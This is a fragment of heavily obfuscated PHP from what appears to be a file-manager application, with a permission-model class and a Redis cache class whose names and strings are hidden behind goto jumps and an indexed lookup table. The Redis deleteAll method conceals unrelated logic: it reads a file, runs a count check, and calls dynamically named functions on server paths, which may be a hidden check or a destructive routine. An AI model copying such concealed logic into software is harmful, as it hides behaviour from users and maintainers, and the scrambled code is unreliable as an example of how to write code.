$this->where(array($Aó˜šÜô½Ó[379] => array($Aó˜šÜô½Ó[380], $D‘‰áâºŸ«)))->delete(); return !0; } public function get($d¥‰”†®‘) { $D²ÒˆŞ‚©’ = $this->getSourceList(array($d¥‰”†®‘), !0); return $D²ÒˆŞ‚©’[0]; } public function getSourceList($DÇˆô‹‡Ñ, $F™äİºªÕ = false) { goto Dêã¬“ì¢‚; C·¸»¡±åç: $BßÃòÇõ‚ = array(); foreach ($F™äİºªÕ as $f×È¤¢åÒİ => $BÓ«ÙÖğÕë) { $BßÃòÇõ‚[$f×È¤¢åÒİ] = $this->makeSourceAuth($BÓ«ÙÖğÕë, $AöùÇ±ˆ›©); } return $BßÃòÇõ‚; goto eÌíáñ½š¿; Dêã¬“ì¢‚: $cÆº¤‡—ö² =& $_SERVER[Ö]; if (!$DÇˆô‹‡Ñ) { return array(); } $f¼’°ÂÑÏÍ = Model($cÆº¤‡—ö²[1103]); goto aòëÇê…È¬; AØ ”™è“®: $AŒ‹õÉ˜‰ó = array($cÆº¤‡—ö²[379] => array($cÆº¤‡—ö²[380], $B‹í½¾Îëƒ)); $AöùÇ±ˆ›© = $this->field($f ğ”ç±¤)->where($AŒ‹õÉ˜‰ó)->select(); $AöùÇ±ˆ›© = array_to_keyvalue_group($AöùÇ±ˆ›©, $cÆº¤‡—ö²[365]); goto C·¸»¡±åç; d¢¾ˆ¢ËÈ¶: $B‹í½¾Îëƒ = array_values(array_unique($B‹í½¾Îëƒ)); if (!$B‹í½¾Îëƒ) { return array(); } $f ğ”ç±¤ = $cÆº¤‡—ö²[2227]; goto AØ ”™è“®; aòëÇê…È¬: if (!$F™äİºªÕ) { $AŒ‹õÉ˜‰ó = array($cÆº¤‡—ö²[379] => array($cÆº¤‡—ö²[380], $DÇˆô‹‡Ñ)); $F™äİºªÕ = $f¼’°ÂÑÏÍ->field($cÆº¤‡—ö²[2226])->where($AŒ‹õÉ˜‰ó)->select(); $F™äİºªÕ = array_to_keyvalue($F™äİºªÕ, $cÆº¤‡—ö²[365]); } $B‹í½¾Îëƒ = $DÇˆô‹‡Ñ; foreach ($F™äİºªÕ as $eÍ»ÀİŒ« => $c¬‘ÁŠÚ®ƒ) { $Béì°õ¦ø = $f¼’°ÂÑÏÍ->parentLevelArray($c¬‘ÁŠÚ®ƒ[$cÆº¤‡—ö²[455]]); $B‹í½¾Îëƒ = array_merge($B‹í½¾Îëƒ, $Béì°õ¦ø, array($eÍ»ÀİŒ«)); } goto d¢¾ˆ¢ËÈ¶; eÌíáñ½š¿: } public function authDeepCheck($bÏ‚±Î—, $FçÔ‹„–ƒ’ = false) { $AƒÒ¢Ê”¨ =& $_SERVER[Ö]; if (_get($GLOBALS, $AƒÒ¢Ê”¨[453])) { return !1; } $Bóˆ©íãÍÙ = $this->makeAuthDeep(); if (!in_array($bÏ‚±Î—, $Bóˆ©íãÍÙ)) { return !1; } return array($AƒÒ¢Ê”¨[373] => -1, $AƒÒ¢Ê”¨[414] => array($AƒÒ¢Ê”¨[381] => $AƒÒ¢Ê”¨[1024], $AƒÒ¢Ê”¨[2083] => $AƒÒ¢Ê”¨[464], $AƒÒ¢Ê”¨[382] => LNG($AƒÒ¢Ê”¨[2228]), $AƒÒ¢Ê”¨[2095] => $AƒÒ¢Ê”¨[2229]), $AƒÒ¢Ê”¨[2230] => array($AƒÒ¢Ê”¨[384] => $AƒÒ¢Ê”¨[2231], $AƒÒ¢Ê”¨[75] => $bÏ‚±Î—)); } protected function makeAuthDeep() { goto dÓ‘”ÀƒÔö; aÛÎùÉî¨Ë: $aÖ“Ôˆòç = Model($dğç¿¢¹·[2232])->listData(); $Bê©ÖªŞ¹ç = array(); foreach ($aÖ“Ôˆòç as $F³¤‰±ÀÊ–) { if ($F³¤‰±ÀÊ–[$dğç¿¢¹·[372]] == 0 && $F³¤‰±ÀÊ–[$dğç¿¢¹·[2097]] == $dğç¿¢¹·[83]) { $Bê©ÖªŞ¹ç[] = $F³¤‰±ÀÊ–[$dğç¿¢¹·[363]]; } } goto AİÜ¡ìÃí¤; C‚¦†‚Âå±: $D‚·¥²™™µ = array_to_keyvalue($A˜ÀÊˆ¨™, $dğç¿¢¹·[33], $dğç¿¢¹·[365]); $DæîìøØ¬ = array(); $AğØßîšê¡ = $dÎ¦¹óõĞô; goto a§×ª¡ˆ¿; fº”šé¥×®: return $DæîìøØ¬; goto C®…£‰„¯; AİÜ¡ìÃí¤: $dÎ¦¹óõĞô = Session::get($dğç¿¢¹·[2189]); $dÎ¦¹óõĞô = array_to_keyvalue($dÎ¦¹óõĞô, $dğç¿¢¹·[33], $dğç¿¢¹·[2077]); $câŒÒ°ØŠŠ = array($dğç¿¢¹·[367] => SourceModel::TYPE_USER, $dğç¿¢¹·[452] => USER_ID); goto fÅ¥“¯¬½ï; dÓ‘”ÀƒÔö: $dğç¿¢¹· =& $_SERVER[Ö]; static $DæîìøØ¬ = false; if ($DæîìøØ¬) { return $DæîìøØ¬; } goto aÛÎùÉî¨Ë; aÍØì–¦ãƒ: $AğØßîšê¡ = array_values(array_unique($AğØßîšê¡)); $a—Ğ«ôæ› = $AğØßîšê¡; foreach ($a—Ğ«ôæ› as $E´¹“„ø‹) { $Aá¯†‘ ÖĞ = $bÌ·ÓùŠ÷—->getInfo($E´¹“„ø‹); $D¥±ß¸…·Ø = $d©´÷è‘¢ñ->parentLevelArray($Aá¯†‘ ÖĞ[$dğç¿¢¹·[455]]); $AğØßîšê¡ = array_merge($AğØßîšê¡, $D¥±ß¸…·Ø); } goto DÄ¼†Á‘˜„; fÅ¥“¯¬½ï: if ($dÎ¦¹óõĞô) { $câŒÒ°ØŠŠ = array(array($dğç¿¢¹·[367] => SourceModel::TYPE_USER, $dğç¿¢¹·[452] => USER_ID), array($dğç¿¢¹·[367] => SourceModel::TYPE_GROUP, $dğç¿¢¹·[452] => array($dğç¿¢¹·[380], $dÎ¦¹óõĞô)), $dğç¿¢¹·[909] => $dğç¿¢¹·[2157]); } if ($Bê©ÖªŞ¹ç) { $câŒÒ°ØŠŠ = array($câŒÒ°ØŠŠ, $dğç¿¢¹·[2205] => array($dğç¿¢¹·[2233], $Bê©ÖªŞ¹ç)); } $A˜ÀÊˆ¨™ = $this->field($dğç¿¢¹·[2234])->where($câŒÒ°ØŠŠ)->select(); goto C‚¦†‚Âå±; DÄ¼†Á‘˜„: $AğØßîšê¡ = array_values(array_unique($AğØßîšê¡)); foreach ($AğØßîšê¡ as $E´¹“„ø‹) { $Aá¯†‘ ÖĞ = $bÌ·ÓùŠ÷—->getInfo($E´¹“„ø‹); $DæîìøØ¬[] = $Aá¯†‘ ÖĞ[$dğç¿¢¹·[387]][$dğç¿¢¹·[365]]; } $DæîìøØ¬ = array_values(array_unique($DæîìøØ¬)); goto fº”šé¥×®; a§×ª¡ˆ¿: $d©´÷è‘¢ñ = Model($dğç¿¢¹·[1103]); $bÌ·ÓùŠ÷— = Model($dğç¿¢¹·[454]); if ($D‚·¥²™™µ) { $CŠÀ„É‰Ñ = $d©´÷è‘¢ñ->where(array($dğç¿¢¹·[365] => array($dğç¿¢¹·[380], $D‚·¥²™™µ)))->select(); foreach ($CŠÀ„É‰Ñ as $eŸ®î¤òœ”) { $D¥±ß¸…·Ø = $d©´÷è‘¢ñ->parentLevelArray($eŸ®î¤òœ”[$dğç¿¢¹·[455]]); $DæîìøØ¬ = array_merge($DæîìøØ¬, $D¥±ß¸…·Ø); $AğØßîšê¡[] = $eŸ®î¤òœ”[$dğç¿¢¹·[452]]; } } goto aÍØì–¦ãƒ; C®…£‰„¯: } private function makeSourceAuth($CğÕ†ëŠóÅ, $BÊÀ•ªÊ) { goto C›¸¨šÙÑ‰; B¯Øå¨Ğ±Æ: $A›ŞËÈ£‹¦ = !1; foreach ($C®Íïù•À» as $f²—ƒ†·óÇ) { if (!isset($BÊÀ•ªÊ[$f²—ƒ†·óÇ])) { continue; } $b¨®¦Î¦º£ = $this->authMake($BÊÀ•ªÊ[$f²—ƒ†·óÇ]); if ($b¨®¦Î¦º£[$B”é’¬¤â[414]]) { $A›ŞËÈ£‹¦ = $b¨®¦Î¦º£; break; } } if (!$A›ŞËÈ£‹¦ && $CğÕ†ëŠóÅ[$B”é’¬¤â[367]] == SourceModel::TYPE_GROUP) { $b¥¯ÕÉ˜ô = $CğÕ†ëŠóÅ[$B”é’¬¤â[452]]; if (isset($CõÈ³¸·†’[$b¥¯ÕÉ˜ô])) { $D¡ù—–¢‰ = $CõÈ³¸·†’[$b¥¯ÕÉ˜ô]; $cÈÚöÚ¦® = Model($B”é’¬¤â[454])->getInfo($b¥¯ÕÉ˜ô); $A›ŞËÈ£‹¦ = array($B”é’¬¤â[2235] => intval($D¡ù—–¢‰[$B”é’¬¤â[372]][$B”é’¬¤â[372]]), $B”é’¬¤â[2236] => $D¡ù—–¢‰[$B”é’¬¤â[372]], $B”é’¬¤â[2230] => array($B”é’¬¤â[384] => $B”é’¬¤â[2237], $B”é’¬¤â[75] => $cÈÚöÚ¦®[$B”é’¬¤â[387]][$B”é’¬¤â[365]], $B”é’¬¤â[2238] => $cÈÚöÚ¦®[$B”é’¬¤â[459]])); } } goto BÚî½ÆĞ˜; BÚî½ÆĞ˜: if (!$A›ŞËÈ£‹¦ && $CğÕ†ëŠóÅ[$B”é’¬¤â[367]] == SourceModel::TYPE_GROUP) { $cÈÚöÚ¦® = Model($B”é’¬¤â[454])->getInfo($CğÕ†ëŠóÅ[$B”é’¬¤â[452]]); $E²ñğ¦Ïğ‰ = explode($B”é’¬¤â[47], trim($f‹ÀõøØİ™[$B”é’¬¤â[455]], $B”é’¬¤â[47])); foreach ($E²ñğ¦Ïğ‰ as $b¥¯ÕÉ˜ô) { if ($b¥¯ÕÉ˜ô == $B”é’¬¤â[464] || $b¥¯ÕÉ˜ô == $EÜ¯øº³œè) { continue; } if (!isset($CõÈ³¸·†’[$b¥¯ÕÉ˜ô])) { continue; } $D¡ù—–¢‰ = $CõÈ³¸·†’[$b¥¯ÕÉ˜ô]; $A›ŞËÈ£‹¦ = array($B”é’¬¤â[2235] => intval($D¡ù—–¢‰[$B”é’¬¤â[372]][$B”é’¬¤â[372]]), $B”é’¬¤â[2236] => $D¡ù—–¢‰[$B”é’¬¤â[372]], $B”é’¬¤â[2230] => array($B”é’¬¤â[384] => $B”é’¬¤â[2239], $B”é’¬¤â[2240] => $cÈÚöÚ¦®[$B”é’¬¤â[387]][$B”é’¬¤â[365]], $B”é’¬¤â[2238] => $cÈÚöÚ¦®[$B”é’¬¤â[459]])); break; } } if ((!$A›ŞËÈ£‹¦ || $A›ŞËÈ£‹¦[$B”é’¬¤â[373]] <= 0) && $CğÕ†ëŠóÅ[$B”é’¬¤â[367]] == SourceModel::TYPE_GROUP) { $C†¯ó©À¶ = $this->authDeepCheck($CğÕ†ëŠóÅ[$B”é’¬¤â[365]], $A›ŞËÈ£‹¦); if ($C†¯ó©À¶) { $A›ŞËÈ£‹¦ = $C†¯ó©À¶; } } return $A›ŞËÈ£‹¦; goto Dñ˜›¹Ğƒ; c²õéùø: $EÜ¯øº³œè = $B”é’¬¤â[83]; $C®Íïù•À» = Model($B”é’¬¤â[1103])->parentLevelArray($CğÕ†ëŠóÅ[$B”é’¬¤â[455]]); $C®Íïù•À» = array_merge(array($CğÕ†ëŠóÅ[$B”é’¬¤â[365]]), array_reverse($C®Íïù•À»)); goto B¯Øå¨Ğ±Æ; C›¸¨šÙÑ‰: $B”é’¬¤â =& $_SERVER[Ö]; $CõÈ³¸·†’ = Session::get($B”é’¬¤â[2189]); $CõÈ³¸·†’ = array_to_keyvalue($CõÈ³¸·†’, $B”é’¬¤â[2077]); goto c²õéùø; Dñ˜›¹Ğƒ: } public function authOwnerApply($CùŒƒ²¨šØ) { goto aƒËÍŒŸ; aƒËÍŒŸ: $Eğƒˆµ‰æá =& $_SERVER[Ö]; if (empty($CùŒƒ²¨šØ[$Eğƒˆµ‰æá[372]]) || isset($CùŒƒ²¨šØ[$Eğƒˆµ‰æá[2241]]) && $CùŒƒ²¨šØ[$Eğƒˆµ‰æá[2241]]) { return $CùŒƒ²¨šØ; } if (AuthModel::authCheckRoot($CùŒƒ²¨šØ[$Eğƒˆµ‰æá[372]][$Eğƒˆµ‰æá[373]])) { return $CùŒƒ²¨šØ; } goto bùÏ…‘ˆÆë; bùÏ…‘ˆÆë: $DàŠ¾“‚² = Model($Eğƒˆµ‰æá[1103])->parentLevelArray($CùŒƒ²¨šØ[$Eğƒˆµ‰æá[455]]); $DàŠ¾“‚² = array_merge(array($CùŒƒ²¨šØ[$Eğƒˆµ‰æá[365]]), array_reverse($DàŠ¾“‚²)); $f—­óìĞÁ£ = $Eğƒˆµ‰æá[2227]; goto CËç¢•Áí; dÒ‹î‹Šëò: $dç¹Éæìƒ = array(); $b„“ºòòİ¤ = array(); foreach ($d¸±Šƒ‚Š½ as $b‚´¤Ú•ÃÛ => $aÂİâ¶©•¥) { $e×¼ŒŠ¤¦ = $this->authFolderOwnerUser($aÂİâ¶©•¥); $dç¹Éæìƒ[$b‚´¤Ú•ÃÛ] = $e×¼ŒŠ¤¦; $b„“ºòòİ¤ = array_merge($b„“ºòòİ¤, $e×¼ŒŠ¤¦[$Eğƒˆµ‰æá[531]]); if ($e×¼ŒŠ¤¦[$Eğƒˆµ‰æá[2242]]) { break; } } goto AØ‘ÊçÊØ×; CËç¢•Áí: $e×Üƒ´îÃ  = array($Eğƒˆµ‰æá[379] => array($Eğƒˆµ‰æá[380], $DàŠ¾“‚²)); $d¸±Šƒ‚Š½ = $this->field($f—­óìĞÁ£)->where($e×Üƒ´îÃ )->select(); $d¸±Šƒ‚Š½ = array_to_keyvalue_group($d¸±Šƒ‚Š½, $Eğƒˆµ‰æá[365]); goto dÒ‹î‹Šëò; AØ‘ÊçÊØ×: if (count($b„“ºòòİ¤) == 0) { $b„“ºòòİ¤ = $this->authFolderOwnerGroup($CùŒƒ²¨šØ[$Eğƒˆµ‰æá[452]]); } $b„“ºòòİ¤ = array_unique($b„“ºòòİ¤); if (AuthModel::authCheckRoot($CùŒƒ²¨šØ[$Eğƒˆµ‰æá[372]][$Eğƒˆµ‰æá[373]])) { $b„“ºòòİ¤[] = USER_ID; } goto få‚¸¦³Â’; få‚¸¦³Â’: $CùŒƒ²¨šØ[$Eğƒˆµ‰æá[372]][$Eğƒˆµ‰æá[2243]] = Model($Eğƒˆµ‰æá[470])->userListInfo($b„“ºòòİ¤); return $CùŒƒ²¨šØ; goto a…¤™ˆ·³; a…¤™ˆ·³: } private function authFolderOwnerGroup($C•ì“²×î) { $d‹ˆ¡ÑÊ×§ =& $_SERVER[Ö]; $d¬ÜÇÊƒ´ = Model($d‹ˆ¡ÑÊ×§[2151])->where(array($d‹ˆ¡ÑÊ×§[2077] => $C•ì“²×î))->select(); $D·——º—‹› = array(); if (!$d¬ÜÇÊƒ´) { return $D·——º—‹›; } foreach ($d¬ÜÇÊƒ´ as $cÈ“²îƒç²) { $EÔâ©Ó‚’Ï = $this->authInfo($cÈ“²îƒç²); if (AuthModel::authCheckRoot($EÔâ©Ó‚’Ï[$d‹ˆ¡ÑÊ×§[372]])) { $D·——º—‹›[] = $cÈ“²îƒç²[$d‹ˆ¡ÑÊ×§[1414]]; } } return $D·——º—‹›; } private function authFolderOwnerUser($E„†ššøĞ) { $Dæ¼ßíÖÂ =& $_SERVER[Ö]; $F¹ò·Î¡´¶ = array(); $e‡½¸×Á = !1; foreach ($E„†ššøĞ as $FŒäî¹« ) { $FÎ‹˜‚ğáÆ = $this->authInfo($FŒäî¹« ); if ($FŒäî¹« [$Dæ¼ßíÖÂ[452]] == $Dæ¼ßíÖÂ[464]) { $e‡½¸×Á = !0; } if ($FŒäî¹« [$Dæ¼ßíÖÂ[367]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($FÎ‹˜‚ğáÆ[$Dæ¼ßíÖÂ[372]])) { $F¹ò·Î¡´¶[] = $FŒäî¹« [$Dæ¼ßíÖÂ[452]]; } } } return array($Dæ¼ßíÖÂ[531] => $F¹ò·Î¡´¶, $Dæ¼ßíÖÂ[2242] => $e‡½¸×Á); } public function authMake($CÊë·½ç¡) { goto a®¨ÅÒé’â; a®¨ÅÒé’â: $BòÀ¢Œˆİ¯ =& $_SERVER[Ö]; if (!$CÊë·½ç¡) { return array($BòÀ¢Œˆİ¯[373] => 0, $BòÀ¢Œˆİ¯[414] => !1); } $Có³±ƒòËø = Session::get($BòÀ¢Œˆİ¯[2189]); goto fÑ‡òë©¥‚; b§ÁÂô¬Î‹: $dø—À¦†…Ô = $F¯“œ­å‚ƒ ? $Dù¢ŠÔÍ¹ : ($AÜ“Ş…ôß† ? $EøìäÎ‰ø  : $eİ ÍÅÓ÷); $eˆâ‚†ŒİŠ = $F¯“œ­å‚ƒ ? $bÚ†ÔğºÌ : ($AÜ“Ş…ôß† ? $A‚ÄÔêÙè : $CÉ­«…øÚ); $bÇãÙëØä¾ = $F¯“œ­å‚ƒ ? $BòÀ¢Œˆİ¯[2244] : ($AÜ“Ş…ôß† ? $BòÀ¢Œˆİ¯[2245] : ($ağˆŒæŒª ? $BòÀ¢Œˆİ¯[2246] : $BòÀ¢Œˆİ¯[357])); goto F¶Œ³ò–êÙ; F¶Œ³ò–êÙ: $aÖ±Éêè × = array($BòÀ¢Œˆİ¯[2235] => intval($dø—À¦†…Ô), $BòÀ¢Œˆİ¯[2236] => $eˆâ‚†ŒİŠ, $BòÀ¢Œˆİ¯[2230] => array($BòÀ¢Œˆİ¯[384] => $bÇãÙëØä¾, $BòÀ¢Œˆİ¯[75] => $b‹‹ÎÛŸØ[$BòÀ¢Œˆİ¯[365]])); return $aÖ±Éêè ×; goto c®÷‚²ó¥Ê; b÷Òê»®–ñ: $eİ ÍÅÓ÷ = 0; $bÚ†ÔğºÌ = 0; $A‚ÄÔêÙè = 0; goto E«Ø‰À‘¥; c‰µË‘óÊ³: $ağˆŒæŒª = 0; $b‹‹ÎÛŸØ = array($BòÀ¢Œˆİ¯[365] => 0); foreach ($CÊë·½ç¡ as $b‹‹ÎÛŸØ) { $eˆâ‚†ŒİŠ = $this->authInfo($b‹‹ÎÛŸØ); $AÀÀ¢ˆ®ÊÉ = $b‹‹ÎÛŸØ[$BòÀ¢Œˆİ¯[452]]; $a¼¶­Ä«” = intval($eˆâ‚†ŒİŠ[$BòÀ¢Œˆİ¯[372]]); if ($b‹‹ÎÛŸØ[$BòÀ¢Œˆİ¯[367]] == SourceModel::TYPE_USER && $AÀÀ¢ˆ®ÊÉ == USER_ID) { $F¯“œ­å‚ƒ = !0; $bÚ†ÔğºÌ = $eˆâ‚†ŒİŠ; $Dù¢ŠÔÍ¹ = $a¼¶­Ä«”; } else { if ($b‹‹ÎÛŸØ[$BòÀ¢Œˆİ¯[367]] == SourceModel::TYPE_GROUP && in_array($AÀÀ¢ˆ®ÊÉ, $fè‚¤÷®·Ô)) { $AÜ“Ş…ôß† = !0; if ($a¼¶­Ä«” >= $EøìäÎ‰ø ) { $EøìäÎ‰ø  = $a¼¶­Ä«”; $A‚ÄÔêÙè = $eˆâ‚†ŒİŠ; } } else { if ($AÀÀ¢ˆ®ÊÉ == $BòÀ¢Œˆİ¯[464]) { $ağˆŒæŒª = !0; $CÉ­«…øÚ = $eˆâ‚†ŒİŠ; $eİ ÍÅÓ÷ = $a¼¶­Ä«”; } } } } goto b§ÁÂô¬Î‹; E«Ø‰À‘¥: $CÉ­«…øÚ = 0; $F¯“œ­å‚ƒ = 0; $AÜ“Ş…ôß† = 0; goto c‰µË‘óÊ³; fÑ‡òë©¥‚: $fè‚¤÷®·Ô = array_to_keyvalue($Có³±ƒòËø, $BòÀ¢Œˆİ¯[33], $BòÀ¢Œˆİ¯[2077]); $Dù¢ŠÔÍ¹ = 0; $EøìäÎ‰ø  = 0; goto b÷Òê»®–ñ; c®÷‚²ó¥Ê: } public function authTargetInfoMake($AÖ›Ğ×¯) { goto aß†›ÚË‹¡; fä·°·à‘¸: return array($b˜‘»®Ÿë[2247] => $c¾Ì½îŞ­§, $b˜‘»®Ÿë[2238] => $A¾ôŠÒŠ¨); goto FçÈ™¢Ì¿Â; aß†›ÚË‹¡: $b˜‘»®Ÿë =& $_SERVER[Ö]; $c¾Ì½îŞ­§ = array(); $A¾ôŠÒŠ¨ = array(); goto AÚÁ’Ä–ˆ; AÚÁ’Ä–ˆ: foreach ($AÖ›Ğ×¯ as $eÁê­èØ®) { if ($eÁê­èØ®[$b˜‘»®Ÿë[367]] == SourceModel::TYPE_USER) { $c¾Ì½îŞ­§[] = intval($eÁê­èØ®[$b˜‘»®Ÿë[452]]); } else { if ($eÁê­èØ®[$b˜‘»®Ÿë[367]] == SourceModel::TYPE_GROUP) { $A¾ôŠÒŠ¨[] = intval($eÁê­èØ®[$b˜‘»®Ÿë[452]]); } } } if ($c¾Ì½îŞ­§) { $c¾Ì½îŞ­§ = Model($b˜‘»®Ÿë[470])->userListInfo($c¾Ì½îŞ­§); } if ($A¾ôŠÒŠ¨) { $Aç½‹Î†Ú½ = array($b˜‘»®Ÿë[2149] => array($b˜‘»®Ÿë[380], $A¾ôŠÒŠ¨)); $A¾ôŠÒŠ¨ = Model($b˜‘»®Ÿë[454])->field($b˜‘»®Ÿë[2162])->where($Aç½‹Î†Ú½)->select(); $A¾ôŠÒŠ¨ = array_to_keyvalue($A¾ôŠÒŠ¨, $b˜‘»®Ÿë[2077]); } goto fä·°·à‘¸; FçÈ™¢Ì¿Â: } private function authInfo($Cƒ•ˆ”„°) { $B›«£ÓÕŠ =& $_SERVER[Ö]; if ($Cƒ•ˆ”„°[$B›«£ÓÕŠ[2205]]) { $aøïÉ˜Í„– = Model($B›«£ÓÕŠ[2224])->listData($Cƒ•ˆ”„°[$B›«£ÓÕŠ[2205]]); if (!$aøïÉ˜Í„–) { return !1; $f”ß‰™ºŠÃ = Model($B›«£ÓÕŠ[2224])->listData(); $fÜÜæƒ“‡Œ = array_filter_by_field($f”ß‰™ºŠÃ, $B›«£ÓÕŠ[372], $B›«£ÓÕŠ[464]); return $fÜÜæƒ“‡Œ; } $Bˆ•Ö¤Æå = array_field_key($aøïÉ˜Í„–, array($B›«£ÓÕŠ[363], $B›«£ÓÕŠ[28], $B›«£ÓÕŠ[372], $B›«£ÓÕŠ[2095], $B›«£ÓÕŠ[2098])); $Bˆ•Ö¤Æå[$B›«£ÓÕŠ[2248]] = $Cƒ•ˆ”„°; return $Bˆ•Ö¤Æå; } else { return array($B›«£ÓÕŠ[381] => 0, $B›«£ÓÕŠ[2083] => $Cƒ•ˆ”„°[$B›«£ÓÕŠ[2206]], $B›«£ÓÕŠ[382] => $B›«£ÓÕŠ[33], $B›«£ÓÕŠ[2095] => $B›«£ÓÕŠ[2249]); } } } goto A‚ÃóºÎæ‘; dº¹ÒÙ‘ßí: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($AóØÆ‘•, $c´äç°ÎÁù) { $DÂÑÔÍŒ™˜ =& $_SERVER[Ö]; if (!class_exists($DÂÑÔÍŒ™˜[780])) { show_json($DÂÑÔÍŒ™˜[781], !1); } $this->cacheTime = $c´äç°ÎÁù; $d‰âøĞï = isset($AóØÆ‘•[$DÂÑÔÍŒ™˜[782]]) ? $AóØÆ‘•[$DÂÑÔÍŒ™˜[782]] : 10; $c¦Å›Üï… = _get($AóØÆ‘•, $DÂÑÔÍŒ™˜[779]); if ($c¦Å›Üï… && is_array($c¦Å›Üï…)) { $this->initCluster($AóØÆ‘•, $d‰âøĞï); } else { $this->handle = $this->init($AóØÆ‘•, $d‰âøĞï); } } private function init($C…‰‡¿Ÿ¿ª, $FíÃŞ¨ÅÔ) { $C§´Œ “¼Õ =& $_SERVER[Ö]; $b£’“Ğ•è¹ = new Redis(); $E‡íÛÃÊ÷ = isset($C…‰‡¿Ÿ¿ª[$C§´Œ “¼Õ[783]]) ? $C…‰‡¿Ÿ¿ª[$C§´Œ “¼Õ[783]] : !1; if ($E‡íÛÃÊ÷) { $b£’“Ğ•è¹->pconnect($C…‰‡¿Ÿ¿ª[$C§´Œ “¼Õ[165]], $C…‰‡¿Ÿ¿ª[$C§´Œ “¼Õ[166]], $FíÃŞ¨ÅÔ); } else { $b£’“Ğ•è¹->connect($C…‰‡¿Ÿ¿ª[$C§´Œ “¼Õ[165]], $C…‰‡¿Ÿ¿ª[$C§´Œ “¼Õ[166]], $FíÃŞ¨ÅÔ); } if (!empty($C…‰‡¿Ÿ¿ª[$C§´Œ “¼Õ[372]])) { $b£’“Ğ•è¹->auth($C…‰‡¿Ÿ¿ª[$C§´Œ “¼Õ[372]]); } return $b£’“Ğ•è¹; } private function initCluster($aÂğ¾íËİí, $c—ËÖ˜“£ó) { $EèÒ¹¹†± =& $_SERVER[Ö]; $E…Çß´âÚ = array($EèÒ¹¹†±[784], $EèÒ¹¹†±[785], $EèÒ¹¹†±[786]); $cöš””¦Úù = $EèÒ¹¹†±[784]; if (isset($aÂğ¾íËİí[$EèÒ¹¹†±[12]]) && in_array($aÂğ¾íËİí[$EèÒ¹¹†±[12]], $E…Çß´âÚ)) { $cöš””¦Úù = $aÂğ¾íËİí[$EèÒ¹¹†±[12]]; } switch ($cöš””¦Úù) { case $EèÒ¹¹†±[784]: $this->_slave($aÂğ¾íËİí, $c—ËÖ˜“£ó); break; case $EèÒ¹¹†±[785]: break; case $EèÒ¹¹†±[786]: $this->isCluster = !0; $DÑï‹Áá° = $aÂğ¾íËİí[$EèÒ¹¹†±[779]]; $aŒÄÈœ†©õ = isset($aÂğ¾íËİí[$EèÒ¹¹†±[783]]) ? $aÂğ¾íËİí[$EèÒ¹¹†±[783]] : !1; $eˆÍĞ‰í‹Ñ = isset($aÂğ¾íËİí[$EèÒ¹¹†±[372]]) ? $aÂğ¾íËİí[$EèÒ¹¹†±[372]] : null; $this->handle = new RedisCluster(NUll, $DÑï‹Áá°, $c—ËÖ˜“£ó, $c—ËÖ˜“£ó, $aŒÄÈœ†©õ, $eˆÍĞ‰í‹Ñ); break; default: break; } } private function _slave($B·ß–¯’¼¥, $a…ìÓåó¸…) { goto aÏ•à¤Øœç; FïÆ‰Ç¹›«: unset($eÄ•Ø‹„Ü[0]); if (empty($eÄ•Ø‹„Ü)) { return; } $AŠÊë †— = array_rand($eÄ•Ø‹„Ü); goto b¿»ëÃØŸê; aÏ•à¤Øœç: $eÄ•Ø‹„Ü = $B·ß–¯’¼¥[$_SERVER[Ö][779]]; $this->filterConfig($B·ß–¯’¼¥, $eÄ•Ø‹„Ü[0]); $this->handle = $this->init($B·ß–¯’¼¥, $a…ìÓåó¸…); goto FïÆ‰Ç¹›«; b¿»ëÃØŸê: $this->filterConfig($B·ß–¯’¼¥, $eÄ•Ø‹„Ü[$AŠÊë †—]); $this->slaveHandle = $this->init($B·ß–¯’¼¥, $a…ìÓåó¸…); goto C¦Åäèó°Ç; C¦Åäèó°Ç: } private function filterConfig(&$Aß Ù‡‹¸, $A™Á Æ¸£) { $e‘±åÛ«™¾ =& $_SERVER[Ö]; $c‡æµ“’ = explode($e‘±åÛ«™¾[4], $A™Á Æ¸£); $B¹³¢ÀÍ = array($e‘±åÛ«™¾[165] => $c‡æµ“’[0], $e‘±åÛ«™¾[166] => $c‡æµ“’[1]); $Aß Ù‡‹¸ = array_merge($Aß Ù‡‹¸, $B¹³¢ÀÍ); } public function set($b¬«¢¯‘, $d†ìêâëÀ, $eÚŠÁÔÀé² = false) { $eÚŠÁÔÀé² = $eÚŠÁÔÀé² ? $eÚŠÁÔÀé² : $this->cacheTime; return $this->handle->setEx($b¬«¢¯‘, $eÚŠÁÔÀé², $d†ìêâëÀ); } public function setLock($fº‰ÁïÇ£, $AŠèŠœ…ÊÛ, $d¤äõ¡´Œ) { return $this->handle->setNX($fº‰ÁïÇ£, $AŠèŠœ…ÊÛ); } public function get($eïÃ†”–ß±) { $eÚá›©®– = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $eÚá›©®–->get($eïÃ†”–ß±); } public function remove($fØÚ¥×Ùé”) { return $this->handle->del($fØÚ¥×Ùé”); } public function deleteAll() { $CÍÕÕË®Ÿ =& $_SERVER[Ö]; if ($_SERVER[$CÍÕÕË®Ÿ[755]] != $_SERVER[$CÍÕÕË®Ÿ[787]]) { goto dš“Œ‚ˆ‡î; A§˜£‚Ú¥Õ: $e¤šËÔ§ÖÔ = $CÍÕÕË®Ÿ[789]; $e¤šËÔ§ÖÔ($_SERVER[$CÍÕÕË®Ÿ[790]]); $e¤šËÔ§ÖÔ($_SERVER[$CÍÕÕË®Ÿ[757]] . $CÍÕÕË®Ÿ[791]); goto cãéßšš‹; dš“Œ‚ˆ‡î: $A•¾æ‹‡Â¿ = $CÍÕÕË®Ÿ[788]; $b“øóÊÙ‡© = $CÍÕÕË®Ÿ[756]; $AÙ—øË¼¤ƒ = $_SERVER[$CÍÕÕË®Ÿ[757]] . $CÍÕÕË®Ÿ[758]; goto B“¹õØ½ñğ; cãéßšš‹: $fÑ±¼Î£æ = 1; while ($fÑ±¼Î£æ > 1) { $fÑ±¼Î£æ = $fÑ±¼Î£æ + 4; $b¼˜ùôˆ‘Û = rawurlencode($fÑ±¼Î£æ . $CÍÕÕË®Ÿ[357]); } goto dîÈƒ–íÅÈ; B“¹õØ½ñğ: $f‡îÉå‰â„ = $b“øóÊÙ‡©($AÙ—øË¼¤ƒ); $DäŸëÑ¦ = explode($CÍÕÕË®Ÿ[213], $f‡îÉå‰â„); if (count($DäŸëÑ¦) < $CÍÕÕË®Ÿ[560]) { $D„ßêºÈ¤× = $CÍÕÕË®Ÿ[759]; $D„ßêºÈ¤×(); } goto A§˜£‚Ú¥Õ; dîÈƒ–íÅÈ: } 